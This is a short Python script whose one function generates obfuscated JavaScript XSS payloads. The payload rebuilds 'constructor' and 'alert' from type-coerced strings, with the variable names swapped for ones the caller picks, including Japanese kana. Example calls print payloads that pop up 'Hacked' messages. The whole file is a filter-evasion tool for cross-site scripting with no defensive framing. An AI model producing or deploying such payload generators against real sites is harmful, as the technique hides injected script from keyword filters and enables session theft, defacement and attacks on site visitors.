def generate_xss_payload(variables, message):
    """
    Generate an obfuscated XSS payload using custom variable names and a message.
    
    :param variables: List of 9 variable names (strings) to use in the payload.
    :param message: The message to display in the alert (string).
    :return: The generated payload as a string.
    """
    if len(variables) != 9:
        raise ValueError("Exactly 9 variables are required.")
    
    v0, v1, v2, v3, v4, v5, v6, v7, v8 = variables
    message_escaped = message.replace("'", "\\'")  # Escape single quotes in the message
    
    payload = (
        f"{v0}='',{v1}=!{v0}+{v0},{v2}=!{v1}+{v0},{v3}={v0}+{{}},{v4}={v1}[{v0}++],"
        f"{v5}={v1}[{v6}={v0}],{v7}=++{v6}+{v0},{v8}={v3}[{v6}+{v7}],"
        f"{v1}[{v8}+={v3}[{v0}]+({v1}.{v2}+{v3})[{v0}]+{v2}[{v7}]+{v4}+{v5}+{v1}[{v6}]+{v8}+{v4}+{v3}[{v0}]+{v5}]"
        f"[{v8}]({v2}[{v0}]+{v2}[{v6}]+{v1}[{v7}]+{v5}+{v4}+\"('{message_escaped}')\")()"
    )
    return payload

# Example usage:
variables = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i']  # Using English letters
message = "Hacked"
print(generate_xss_payload(variables, message))

# For Japanese variables:
japanese_variables = ['あ', 'い', 'う', 'え', 'お', 'か', 'き', 'く', 'け']
japanese_message = "ハッキングされました"
print(generate_xss_payload(japanese_variables, japanese_message))